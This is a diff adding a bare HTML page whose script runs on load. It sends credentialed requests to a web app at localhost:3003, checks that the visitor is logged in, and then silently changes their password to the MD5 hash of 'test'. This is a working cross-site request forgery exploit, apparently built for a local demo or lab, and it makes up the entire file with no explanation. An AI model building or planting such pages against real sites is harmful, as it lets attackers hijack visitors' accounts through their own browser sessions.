@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+
+<head>
+    <script>
+        fetch("http://localhost:3003/isAuthenticated", { method: "POST", credentials: 'include' }).then((res) => {
+            if (res.status == 200) {
+                let payload = JSON.stringify({ password: '098f6bcd4621d373cade4e832627b4f6' }); //md5('test')
+                fetch("http://localhost:3003/changePassword", { method: "POST", credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: payload });
+            }
+        }
+        );
+    </script>
+</head>
+
+<body></body>
